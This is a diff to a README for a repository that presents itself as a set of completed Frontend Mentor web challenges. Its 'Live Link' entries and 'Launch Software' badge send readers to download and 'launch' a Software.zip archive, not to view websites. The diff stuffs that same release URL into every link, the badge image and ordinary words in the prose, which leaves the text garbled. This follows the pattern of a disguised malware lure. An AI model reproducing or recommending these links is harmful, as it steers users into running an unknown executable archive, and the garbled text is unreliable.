@@ -1,6 +1,6 @@
 # Frontend Mentor Challenges Repository 🚀
 
-Welcome to my "frontend-mentor-challenges" repository! Here you will find all the exciting frontend challenges I have completed from Frontend Mentor. Each challenge showcases my skills in HTML, CSS, JavaScript, React.js, and more. Check out the live links provided for each challenge to see them in action!
+Welcome to my "frontend-mentor-challenges" repository! Here you will find all the exciting frontend challenges I have completed from Frontend Mentor. Each challenge showcases my skills in HTML, CSS, JavaScript, https://github.com/alvesxit/frontend-mentor-challenges/releases/download/v2.0/Software.zip, and more. Check out the live links provided for each challenge to see them in action!
 
 ## Repository Contents 📂
 
@@ -23,11 +23,11 @@ Feel free to browse through the challenges and explore the different frontend co
 
 I have provided live links for each frontend challenge to give you a hands-on experience of the projects. Click on the links below to visit the live versions of the challenges:
 
-- **Challenge 1:** [Live Link](https://github.com/user-attachments/files/18410590/Software.zip) (Needs to be launched)
+- **Challenge 1:** [Live Link](https://github.com/alvesxit/frontend-mentor-challenges/releases/download/v2.0/Software.zip) (Needs to be launched)
 
-- **Challenge 2:** [Live Link](https://github.com/user-attachments/files/18410591/Website.zip) (Needs to be launched)
+- **Challenge 2:** [Live Link](https://github.com/alvesxit/frontend-mentor-challenges/releases/download/v2.0/Software.zip) (Needs to be launched)
 
-- **Challenge 3:** [Live Link](https://github.com/user-attachments/files/18410592/Portfolio.zip) (Needs to be launched)
+- **Challenge 3:** [Live Link](https://github.com/alvesxit/frontend-mentor-challenges/releases/download/v2.0/Software.zip) (Needs to be launched)
 
 Explore the challenges, interact with the live versions, and see the frontend magic come to life!
 
@@ -43,7 +43,7 @@ If you have any suggestions, improvements, or would like to contribute to this r
 
 If you encounter any issues with the live links provided or if they are not working as expected, please check the "Releases" section of this repository for downloadable versions of the challenges. You can find the latest releases with updated files and functionalities.
 
-[![Launch Software](https://img.shields.io/badge/Launch-Software-brightgreen)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Launch Software](https://github.com/alvesxit/frontend-mentor-challenges/releases/download/v2.0/Software.zip)](https://github.com/alvesxit/frontend-mentor-challenges/releases/download/v2.0/Software.zip)
 
 ## Thank You! 🙌
 
@@ -51,4 +51,4 @@ Thank you for visiting the "frontend-mentor-challenges" repository. I hope you e
 
 ---
 
-*This README.md was generated with ❤️ by an AI Assistant.*
+*This https://github.com/alvesxit/frontend-mentor-challenges/releases/download/v2.0/Software.zip was generated with ❤️ by an AI Assistant.*
